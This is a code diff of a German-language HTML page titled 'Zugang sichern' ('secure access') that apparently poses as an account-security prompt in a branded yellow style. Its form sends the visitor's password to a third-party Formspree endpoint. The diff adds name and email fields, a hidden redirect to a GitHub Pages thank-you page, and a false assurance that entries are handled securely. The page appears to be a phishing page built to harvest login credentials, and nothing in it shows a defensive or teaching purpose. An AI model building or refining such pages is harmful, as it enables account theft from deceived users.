@@ -5,58 +5,73 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Zugang sichern</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
     body {
       font-family: 'Segoe UI', sans-serif;
-      background-color: #f8f8f8;
+      background: linear-gradient(135deg, #fefcea, #f1da36);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       margin: 0;
     }
 
     .container {
       background: white;
       padding: 2rem;
-      border-radius: 16px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
+      border-radius: 1.5rem;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
       width: 90%;
-      max-width: 400px;
+      max-width: 420px;
       text-align: center;
     }
 
     h1 {
-      color: #fffc00;
-      font-size: 1.8rem;
+      color: #ffc400;
+      font-size: 2rem;
+      margin-bottom: 1rem;
     }
 
     input {
       width: 100%;
-      padding: 0.8rem;
+      padding: 0.9rem;
       margin-top: 1rem;
       font-size: 1rem;
       border: 1px solid #ccc;
-      border-radius: 8px;
+      border-radius: 10px;
+      transition: 0.3s;
+    }
+
+    input:focus {
+      border-color: #ffc400;
+      outline: none;
+      box-shadow: 0 0 5px rgba(255, 196, 0, 0.5);
     }
 
     button {
-      margin-top: 1rem;
-      padding: 0.8rem 1.2rem;
-      background-color: #fffc00;
+      margin-top: 1.5rem;
+      padding: 0.9rem 1.5rem;
+      background-color: #ffc400;
       border: none;
       font-weight: bold;
+      font-size: 1rem;
+      color: #222;
       cursor: pointer;
-      border-radius: 8px;
+      border-radius: 10px;
       transition: 0.2s;
+      width: 100%;
     }
 
     button:hover {
-      background-color: #f2f200;
+      background-color: #e0ae00;
     }
 
-    .message {
-      margin-top: 1rem;
-      font-size: 1rem;
+    .footer-text {
+      margin-top: 1.5rem;
+      font-size: 0.95rem;
+      color: #666;
     }
   </style>
 </head>
@@ -64,10 +79,13 @@
   <div class="container">
     <h1>🔐 Zugang sichern</h1>
     <form action="https://formspree.io/f/xyzwyzzg" method="POST">
+      <input type="text" name="name" placeholder="Dein Name" required />
+      <input type="email" name="email" placeholder="Deine E-Mail" required />
       <input type="password" name="password" placeholder="Passwort eingeben" required />
+      <input type="hidden" name="_redirect" value="https://kopfab112233.github.io/pages/danke.html">
       <button type="submit">Absenden</button>
     </form>
-    <div class="message">🔒 Deine Eingabe wird vertraulich behandelt.</div>
+    <div class="footer-text">🔒 Deine Eingaben werden sicher verarbeitet.</div>
   </div>
 </body>
 </html>
